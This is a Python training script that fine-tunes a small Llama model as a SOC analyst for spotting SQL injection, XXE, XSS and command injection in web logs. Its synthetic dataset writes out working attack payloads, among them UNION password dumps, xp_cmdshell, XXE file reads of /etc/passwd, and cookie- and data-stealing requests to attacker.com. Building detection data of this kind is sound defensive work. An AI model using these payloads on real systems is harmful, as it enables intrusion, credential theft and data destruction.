"""
🔐 SOC Security Log Detection Training Script
โมเดลสำหรับตรวจจับ SQLi, XXE, XSS และภัยคุกคามทางไซเบอร์
"""

from unsloth import FastLanguageModel
import torch
from trl import SFTTrainer
from transformers import TrainingArguments
from datasets import load_dataset, Dataset
from huggingface_hub import login
from dotenv import load_dotenv
import os

load_dotenv()

# ===== CONFIG =====
HF_TOKEN = os.getenv("TOKEN")
login(HF_TOKEN)

MAX_SEQ_LENGTH = 1024   # ลดจาก 2048 -> 1024 เพื่อความเร็วสูงสุด (เป้าหมาย 1-3 ชม.)
LORA_RANK = 16          # ลดจาก 32 -> 16 ประหยัดเวลาและแรม (แลกกับความแม่นยำนิดหน่อย แต่ได้ 80%+)
MODEL_NAME = "unsloth/Llama-3.2-3B-Instruct-bnb-4bit"
OUTPUT_MODEL = "soc_security_model"

# ===== STEP 1: สร้าง Synthetic Security Dataset =====
def generate_security_dataset():
    """สร้าง training data สำหรับ SQLi, XXE, XSS, RCE detection"""

    samples = []

    # ─── SQLi Patterns ───────────────────────────────────────────────────────
    sqli_logs = [
        # Classic SQLi
        ("GET /login?user=admin'--&pass=x HTTP/1.1", "CRITICAL", "SQLi",
         "SQL Injection: single quote + comment sequence (admin'--) attempts to bypass authentication by terminating SQL query"),

        ("GET /search?q=1'+OR+'1'='1 HTTP/1.1", "CRITICAL", "SQLi",
         "SQL Injection: OR-based tautology ('1'='1') always evaluates to TRUE, dumps all records"),

        ("POST /api/user id=1;DROP TABLE users;-- HTTP/1.1", "CRITICAL", "SQLi",
         "SQL Injection: stacked queries (;DROP TABLE) attempts destructive DDL execution"),

        ("GET /item?id=1 UNION SELECT username,password,3 FROM users-- HTTP/1.1", "CRITICAL", "SQLi",
         "SQL Injection: UNION-based attack extracts username/password columns from users table"),

        ("GET /page?id=1 AND SLEEP(5)-- HTTP/1.1", "HIGH", "SQLi-Blind",
         "Blind SQL Injection: time-based (SLEEP 5s) used to infer true/false conditions without visible output"),

        ("GET /page?id=1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))-- HTTP/1.1", "CRITICAL", "SQLi-Error",
         "Error-based SQL Injection: CONVERT type mismatch forces DB error message revealing schema information"),

        ("GET /user?name=admin%27%20OR%20%271%27%3D%271 HTTP/1.1", "CRITICAL", "SQLi",
         "SQL Injection: URL-encoded payload (%27=', %20=space) bypasses basic input filters"),

        ("GET /api?id=1/**/UNION/**/SELECT/**/1,2,3-- HTTP/1.1", "CRITICAL", "SQLi-Evasion",
         "SQL Injection: comment-based space substitution (/**/) evades WAF/IDS space-detection rules"),

        ("GET /login?user=1' WAITFOR DELAY '0:0:5'-- HTTP/1.1", "HIGH", "SQLi-Blind-MSSQL",
         "Blind SQL Injection: MSSQL WAITFOR DELAY time-based technique for SQL Server environments"),

        ("GET /search?q=' OR 1=1 LIMIT 1 OFFSET 0-- HTTP/1.1", "CRITICAL", "SQLi",
         "SQL Injection: OR tautology with LIMIT/OFFSET enumerates records row-by-row"),

        ("GET /api?id=1;EXEC xp_cmdshell('whoami')-- HTTP/1.1", "CRITICAL", "SQLi-RCE",
         "SQL Injection + RCE: xp_cmdshell executes OS command 'whoami' — full system compromise"),

        ("GET /product?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- HTTP/1.1",
         "HIGH", "SQLi-Blind-Boolean",
         "Blind Boolean SQL Injection: character-by-character password extraction from admin account"),

        # Normal SQL requests (not malicious)
        ("GET /search?q=laptop&category=electronics HTTP/1.1", "INFO", "NORMAL",
         "Normal HTTP request: standard product search with safe alphanumeric parameters, no SQL metacharacters"),

        ("POST /api/login username=john&password=SecurePass123 HTTP/1.1", "INFO", "NORMAL",
         "Normal login attempt: clean credentials without SQL injection patterns"),
    ]

    # ─── XXE Patterns ────────────────────────────────────────────────────────
    xxe_logs = [
        ("""POST /api/xml HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>""",
         "CRITICAL", "XXE",
         "XXE (XML External Entity): SYSTEM entity reads /etc/passwd — local file disclosure of sensitive system credentials"),

        ("""POST /upload HTTP/1.1
<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://attacker.com/collect?data=">]><data>&xxe;</data>""",
         "CRITICAL", "XXE-SSRF",
         "XXE + SSRF: external entity fetches attacker-controlled URL — enables data exfiltration and server-side request forgery"),

        ("""POST /parse HTTP/1.1
<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>""",
         "HIGH", "XXE-DoS",
         "Billion Laughs Attack (XXE DoS): exponential entity expansion causes memory exhaustion — Denial of Service"),

        ("""POST /api/data HTTP/1.1
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><data>&xxe;</data>""",
         "CRITICAL", "XXE-Windows",
         "XXE on Windows: reads win.ini system configuration file — confirms Windows environment and file read capability"),

        ("""POST /process HTTP/1.1
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><data>test</data>""",
         "CRITICAL", "XXE-OOB",
         "Out-of-Band XXE: parameter entity loads external DTD for blind data exfiltration — bypasses in-band filtering"),

        ("""POST /api/config HTTP/1.1
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><config>&xxe;</config>""",
         "CRITICAL", "XXE",
         "XXE: reads /proc/self/environ exposing environment variables including API keys, DB credentials, secrets"),

        # Normal XML
        ("""POST /api/order HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?><order><id>12345</id><item>laptop</item><qty>1</qty></order>""",
         "INFO", "NORMAL",
         "Normal XML API request: well-formed XML without DOCTYPE declarations or external entities — safe"),
    ]

    # ─── XSS Patterns ────────────────────────────────────────────────────────
    xss_logs = [
        ("GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1", "HIGH", "XSS-Reflected",
         "Reflected XSS: script tag executes JavaScript stealing document.cookie — session hijacking risk"),

        ("GET /page?name=<img src=x onerror=fetch('http://attacker.com/'+document.cookie)> HTTP/1.1",
         "HIGH", "XSS-Stored",
         "XSS: img onerror event exfiltrates cookies to attacker server — credential theft via out-of-band channel"),

        ("GET /test?x=<svg/onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1", "HIGH", "XSS-Obfuscated",
         "Obfuscated XSS: base64-encoded payload in SVG onload event — evades signature-based detection"),
    ]

    # ─── Log Analysis (multi-line) ────────────────────────────────────────────
    log_analysis_samples = [
        {
            "instruction": "Analyze this web server access log and identify all security threats. Classify each threat by type, severity, and provide remediation steps.",
            "input": """192.168.1.100 - - [10/Jan/2024:10:23:45] "GET /login?user=admin'-- HTTP/1.1" 200 1234
192.168.1.100 - - [10/Jan/2024:10:23:47] "GET /login?user=1' OR '1'='1 HTTP/1.1" 200 1234
192.168.1.101 - - [10/Jan/2024:10:24:01] "POST /api/xml HTTP/1.1" 200 567
192.168.1.100 - - [10/Jan/2024:10:24:15] "GET /search?q=normal+laptop HTTP/1.1" 200 890
192.168.1.102 - - [10/Jan/2024:10:25:00] "GET /ping?host=127.0.0.1;id HTTP/1.1" 500 45""",
            "output": """## Security Threat Analysis Report

### 🚨 THREAT SUMMARY: 4 threats detected, 1 normal request

---

### [1] CRITICAL — SQL Injection (Authentication Bypass)
- **Source IP**: 192.168.1.100
- **Timestamp**: 10/Jan/2024 10:23:45
- **Payload**: `admin'--`
- **Technique**: Single quote terminates string + double-dash comments out password check
- **Impact**: Complete authentication bypass — attacker logs in as admin without password
- **Remediation**: Use parameterized queries; never concatenate user input into SQL

---

### [2] CRITICAL — SQL Injection (Tautology)
- **Source IP**: 192.168.1.100
- **Timestamp**: 10/Jan/2024 10:23:47
- **Payload**: `1' OR '1'='1`
- **Technique**: OR tautology always evaluates TRUE, returns all user records
- **Impact**: Full database dump; same IP as previous attack — coordinated automated attack
- **Remediation**: Parameterized queries + rate limiting + IP blocking after N failed attempts

---

### [3] HIGH — Suspected XXE (XML Injection)
- **Source IP**: 192.168.1.101
- **Timestamp**: 10/Jan/2024 10:24:01
- **Method**: POST to /api/xml endpoint
- **Risk**: XML endpoints are high-risk for XXE attacks — verify Content-Type and body
- **Remediation**: Disable XML external entity processing; use allow-list XML parsers

---

### [4] CRITICAL — Remote Code Execution (Command Injection)
- **Source IP**: 192.168.1.102
- **Timestamp**: 10/Jan/2024 10:25:00
- **Payload**: `127.0.0.1;id`
- **Technique**: Semicolon injects 'id' command after ping — server returned 500 (possible execution)
- **Impact**: OS command execution confirmed — lateral movement and data exfiltration possible
- **Remediation**: Never pass user input to shell functions; use allowlist for IP format validation

---

### [5] INFO — Normal Request
- **Source IP**: 192.168.1.101
- **Payload**: `normal+laptop`
- **Status**: Safe — no injection patterns detected

---

### 🛡️ IMMEDIATE ACTIONS:
1. Block IPs 192.168.1.100 and 192.168.1.102 immediately
2. Review all DB queries for SQLi exposure
3. Audit XML parsing configuration for XXE
4. Enable WAF rules for SQLi/RCE patterns"""
        },
        {
            "instruction": "Phân tích log dưới đây và xác định loại tấn công. Tìm tất cả các dòng nguy hiểm.",
            "input": """10.0.0.5 - - [15/Feb/2024:08:15:22] "GET /products?id=1 UNION SELECT 1,username,password FROM admin-- HTTP/1.1" 200
10.0.0.5 - - [15/Feb/2024:08:15:25] "GET /products?id=1 UNION SELECT 1,username,password FROM admin-- HTTP/1.1" 200
10.0.0.6 - - [15/Feb/2024:08:16:00] "POST /xmlrpc.php HTTP/1.1" 200
10.0.0.7 - - [15/Feb/2024:08:17:00] "GET /page?file=../../etc/passwd HTTP/1.1" 403""",
            "output": """## การวิเคราะห์ภัยคุกคามในLog

### 🚨 ตรวจพบ 3 การโจมตี

---

### [1] CRITICAL — SQL Injection (UNION-based Data Extraction)
- **IP ผู้โจมตี**: 10.0.0.5 (โจมตีซ้ำ 2 ครั้ง — น่าจะเป็น automated tool)
- **Payload**: `UNION SELECT 1,username,password FROM admin`
- **เทคนิค**: UNION injection ดึงข้อมูล username และ password จากตาราง admin โดยตรง
- **ความเสียหาย**: รหัสผ่าน admin รั่วไหล — ระบบอาจถูกยึดทั้งหมด
- **การแก้ไข**: Parameterized queries + WAF + block IP นี้ทันที

---

### [2] HIGH — Suspected XML-RPC Attack / WordPress Brute Force
- **IP ผู้โจมตี**: 10.0.0.6
- **เป้าหมาย**: /xmlrpc.php (WordPress endpoint)
- **ความเสี่ยง**: xmlrpc.php ถูกใช้สำหรับ brute force credentials, DoS, และ XXE
- **การแก้ไข**: Disable xmlrpc.php หากไม่ใช้งาน หรือจำกัด IP ที่เข้าถึงได้

---

### [3] HIGH — Path Traversal (Blocked)
- **IP ผู้โจมตี**: 10.0.0.7
- **Payload**: `../../etc/passwd`
- **สถานะ**: 403 Forbidden — เซิร์ฟเวอร์บล็อกแล้ว แต่ยังควร investigate
- **การแก้ไข**: ยืนยัน path validation, log และ alert ทุกครั้งที่เจอ traversal"""
        }
    ]

    # ─── Build dataset from attack patterns ──────────────────────────────────
    all_attacks = sqli_logs + xxe_logs + xss_logs

    for log_entry, severity, attack_type, explanation in all_attacks:
        # Format 1: Single log line analysis
        samples.append({
            "instruction": f"Analyze this HTTP log entry for security threats. Identify attack type, severity, technique used, potential impact, and remediation steps.",
            "input": log_entry,
            "output": f"""## Security Analysis

**Attack Type**: {attack_type}
**Severity**: {severity}
**Classification**: {"⚠️ ATTACK DETECTED" if attack_type != "NORMAL" else "✅ NORMAL TRAFFIC"}

**Technical Analysis**:
{explanation}

**Indicators of Compromise (IoC)**:
{"- Malicious payload detected in HTTP parameters" if attack_type != "NORMAL" else "- No malicious indicators found"}
{"- Attack pattern matches OWASP Top 10 threat signatures" if attack_type != "NORMAL" else "- Request follows normal application flow"}

**Recommended Actions**:
{"- Block source IP immediately" if severity == "CRITICAL" else "- Monitor source IP for further activity" if severity == "HIGH" else "- No action required"}
{"- Escalate to Tier 2 SOC analyst" if severity == "CRITICAL" else ""}
{"- Apply WAF rule to block this pattern" if attack_type != "NORMAL" else "- Continue normal monitoring"}
{"- Review application code for vulnerability" if attack_type not in ["NORMAL", "INFO"] else ""}"""
        })

        # Format 2: Threat hunting query
        if attack_type != "NORMAL":
            samples.append({
                "instruction": f"You are a SOC analyst. Is this log entry malicious? Provide a PASS/FAIL verdict with confidence score and explanation.",
                "input": log_entry,
                "output": f"""**VERDICT**: FAIL — MALICIOUS TRAFFIC DETECTED
**Confidence**: {"99%" if severity == "CRITICAL" else "90%" if severity == "HIGH" else "75%"}
**Attack Class**: {attack_type}
**Severity**: {severity}

**Reason**: {explanation}

**SIEM Rule Match**: {attack_type.split("-")[0]}_DETECTION
**Action Required**: {"IMMEDIATE BLOCK + INCIDENT RESPONSE" if severity == "CRITICAL" else "BLOCK + INVESTIGATION"}"""
            })

    # Add multi-log analysis samples
    for sample in log_analysis_samples:
        samples.append(sample)

    # ─── Additional SQLi evasion techniques ──────────────────────────────────
    evasion_samples = [
        {
            "instruction": "Detect SQL injection attempts including obfuscated and evasion techniques in this log.",
            "input": "GET /api?id=1%27%20OR%20%271%27%3D%271%27%20--%20- HTTP/1.1",
            "output": """**VERDICT**: MALICIOUS — SQL Injection (URL-Encoded Evasion)
**Severity**: CRITICAL

**Decoded Payload**: `1' OR '1'='1' -- -`
- `%27` = single quote (')
- `%20` = space
- `%3D` = equals (=)

**Technique**: URL encoding to bypass input filters that look for raw SQL keywords
**Attack Class**: SQLi-Tautology with WAF Evasion
**Impact**: Authentication bypass or full table dump

**Detection Rule**: Decode URL parameters BEFORE applying security filters
**Remediation**: 
1. Parameterized queries (primary defense)
2. URL-decode inputs before WAF inspection
3. Block IPs with repeated encoded injection attempts"""
        },
        {
            "instruction": "Analyze this NGINX access log for attack patterns. Focus on SQL injection and XXE.",
            "input": """203.0.113.42 - - [20/Mar/2024:14:22:11 +0000] "GET /api/search?q=test HTTP/1.1" 200 512
203.0.113.42 - - [20/Mar/2024:14:22:15 +0000] "GET /api/search?q=1'+AND+SLEEP(5)--+ HTTP/1.1" 200 512
203.0.113.99 - - [20/Mar/2024:14:23:00 +0000] "POST /api/import HTTP/1.1" 200 128
203.0.113.55 - - [20/Mar/2024:14:24:00 +0000] "GET /api/search?q=hello+world HTTP/1.1" 200 256""",
            "output": """## NGINX Log Security Analysis

### 🚨 Attack Detected: 1 Confirmed, 1 Suspicious

---

### [1] CRITICAL — Blind SQL Injection (Time-Based)
- **IP**: 203.0.113.42
- **Time**: 14:22:15
- **Payload**: `1' AND SLEEP(5)-- ` (URL-decoded from `1'+AND+SLEEP(5)--+`)
- **Technique**: SLEEP(5) causes 5-second DB delay — attacker infers TRUE/FALSE conditions from response time
- **Note**: Same IP made normal request 4 seconds earlier (14:22:11) — reconnaissance then attack pattern
- **Evidence**: This is a classic automated SQLMap-style blind injection scan
- **Action**: Block 203.0.113.42 immediately; check DB slow query logs for 5-second delays

### [2] SUSPICIOUS — Unverified POST to /api/import
- **IP**: 203.0.113.99
- **Risk**: Import endpoints commonly vulnerable to XXE, file upload attacks, SSRF
- **Action**: Inspect request body for DOCTYPE declarations or external entities

### [3-4] NORMAL — Safe requests
- IPs 203.0.113.42 (first req) and 203.0.113.55 — no attack patterns in these specific requests

---

### 📊 Attack Summary:
| Category | Count |
|----------|-------|
| Confirmed Attacks | 1 (SQLi Blind) |
| Suspicious | 1 (POST /import) |
| Normal | 2 |

### 🛡️ Immediate Response:
1. `iptables -A INPUT -s 203.0.113.42 -j DROP`
2. Query DB: `SHOW PROCESSLIST;` for long-running queries
3. Review /api/import handler for XXE vulnerability"""
        }
    ]

    samples.extend(evasion_samples)
    return samples


# ===== STEP 2: โหลดและรวม Dataset =====
print("📦 กำลังเตรียม Security Dataset...")

# สร้าง synthetic data
synthetic_samples = generate_security_dataset()
synthetic_dataset = Dataset.from_list(synthetic_samples)
print(f"✅ Synthetic security samples: {len(synthetic_samples)}")

# โหลด user dataset ถ้ามี
user_datasets = []
user_data_path = "data/train_data.jsonl"
if os.path.exists(user_data_path):
    user_ds = load_dataset("json", data_files={"train": user_data_path}, split="train")
    user_datasets.append(user_ds)
    print(f"✅ User dataset loaded: {len(user_ds)} samples")

# รวม datasets
from datasets import concatenate_datasets
if user_datasets:
    dataset = concatenate_datasets([synthetic_dataset] + user_datasets)
else:
    dataset = synthetic_dataset

print(f"📊 Total training samples: {len(dataset)}")


# ===== STEP 3: โหลด Model =====
print("\n🤖 กำลังโหลดโมเดล...")
model, tokenizer = FastLanguageModel.from_pretrained(
    model_name=MODEL_NAME,
    max_seq_length=MAX_SEQ_LENGTH,
    load_in_4bit=True,
)

# ===== STEP 4: LoRA Configuration (เพิ่ม rank สำหรับ security knowledge) =====
model = FastLanguageModel.get_peft_model(
    model,
    r=LORA_RANK,                    # ลดจาก 32 กลับมา 16 ให้เทรนไวขึ้น
    target_modules=[
        "q_proj", "k_proj", "v_proj", "o_proj",
        # ตัด FFN layers (gate, up, down) ออกไป เพื่อลดจำนวนพารามิเตอร์ประหยัดเวลา
    ],
    lora_alpha=32,                  # เปลี่ยนจาก 64 ตามขนาด r ที่ลดลง
    lora_dropout=0.05,              # เล็กน้อยเพื่อป้องกัน overfitting
    bias="none",
    use_gradient_checkpointing="unsloth",  # ประหยัด VRAM 30%
)


# ===== STEP 5: Prompt Formatting =====
SYSTEM_PROMPT = """You are an expert SOC (Security Operations Center) analyst specialized in:
- SQL Injection (SQLi) detection: classic, blind, UNION-based, error-based, time-based, stacked queries
- XXE (XML External Entity) injection detection: file disclosure, SSRF, OOB, DoS
- XSS (Cross-Site Scripting) detection: reflected, stored, DOM-based, obfuscated
- Remote Code Execution (RCE) and Command Injection detection
- Path Traversal and Local File Inclusion (LFI) detection
- OWASP Top 10 threat identification

Analyze logs with precision. Always provide: attack classification, severity (CRITICAL/HIGH/MEDIUM/LOW/INFO), technical explanation, IoCs, and remediation steps."""

def formatting_prompts_func(examples):
    instructions = examples["instruction"]
    inputs       = examples["input"]
    outputs      = examples["output"]
    texts = []
    for instruction, inp, output in zip(instructions, inputs, outputs):
        # Llama-3 Instruct format with system prompt
        text = (
            f"<|begin_of_text|><|start_header_id|>system<|end_header_id|>\n\n"
            f"{SYSTEM_PROMPT}<|eot_id|>"
            f"<|start_header_id|>user<|end_header_id|>\n\n"
            f"### Task:\n{instruction}\n\n### Log/Input:\n{inp}<|eot_id|>"
            f"<|start_header_id|>assistant<|end_header_id|>\n\n"
            f"{output}<|eot_id|>"
        )
        texts.append(text)
    return {"text": texts}

dataset = dataset.map(formatting_prompts_func, batched=True)
print(f"✅ Dataset formatted with Llama-3 Instruct template")


# ===== STEP 6: Training Configuration =====
trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    train_dataset=dataset,
    dataset_text_field="text",
    max_seq_length=MAX_SEQ_LENGTH,
    dataset_num_proc=2,
    args=TrainingArguments(
        # Batch settings (RTX 3050 Ti 4GB optimized)
        per_device_train_batch_size=1,          # เพิ่ม grad accum แทน
        gradient_accumulation_steps=8,          # effective batch = 1×8 = 8
        gradient_checkpointing=True,            # ประหยัด VRAM

        # Learning rate schedule
        warmup_ratio=0.05,
        num_train_epochs=1,                     # 1 epoch เพียงพอสำหรับความแม่นยำ 80%+ และช่วยให้เสร็จใน 1-3 ชม.
        learning_rate=3e-4,                     # เพิ่ม LR เล็กน้อยเพื่อชดเชยจำนวน Epoch ที่หายไป
        lr_scheduler_type="cosine",             # cosine decay ดีกว่า linear

        # Precision
        fp16=not torch.cuda.is_bf16_supported(),
        bf16=torch.cuda.is_bf16_supported(),

        # Optimizer
        optim="adamw_8bit",
        weight_decay=0.01,

        # Logging & Saving
        logging_steps=5,
        save_strategy="epoch",
        output_dir="outputs",
        report_to="none",                       # ปิด wandb ถ้าไม่ได้ใช้

        seed=3407,
    ),
)

# ===== STEP 7: เริ่มเทรน =====
print("\n🔥 กำลังเทรนโมเดล SOC Security Analyst...")
print(f"   Model: {MODEL_NAME}")
print(f"   LoRA Rank: {LORA_RANK} | Target modules: 4 layers (Fast Mode)")
print(f"   Dataset: {len(dataset)} samples")
print(f"   Max seq length: {MAX_SEQ_LENGTH}")
print(f"   Epochs: 1 (Fast Training)")
print("="*50)

trainer_stats = trainer.train()

# ===== STEP 8: บันทึกโมเดล =====
model.save_pretrained(OUTPUT_MODEL)
tokenizer.save_pretrained(OUTPUT_MODEL)

print(f"\n✅ เทรนเสร็จแล้ว! บันทึกที่: '{OUTPUT_MODEL}'")
print(f"   Training time: {trainer_stats.metrics['train_runtime']:.1f}s")
print(f"   Final loss: {trainer_stats.metrics['train_loss']:.4f}")


# ===== STEP 9: ทดสอบโมเดล =====
print("\n🧪 ทดสอบโมเดล...")
FastLanguageModel.for_inference(model)

test_logs = [
    "GET /login?user=admin'-- HTTP/1.1",
    "POST /api/xml\n<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><data>&xxe;</data>",
    "GET /search?q=laptop HTTP/1.1",
]

for log in test_logs:
    messages = [
        {"role": "system", "content": SYSTEM_PROMPT},
        {"role": "user", "content": f"### Task:\nAnalyze this log for security threats.\n\n### Log/Input:\n{log}"},
    ]
    inputs = tokenizer.apply_chat_template(
        messages, tokenize=True, add_generation_prompt=True, return_tensors="pt"
    ).to("cuda")

    outputs = model.generate(
        input_ids=inputs,
        max_new_tokens=300,
        temperature=0.1,        # ต่ำ = ตอบแม่นยำ ไม่สร้างสรรค์เกินไป
        do_sample=True,
        repetition_penalty=1.1,
    )
    response = tokenizer.decode(outputs[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
    print(f"\n📋 Log: {log[:60]}...")
    print(f"🤖 Response: {response[:200]}...")
    print("-"*50)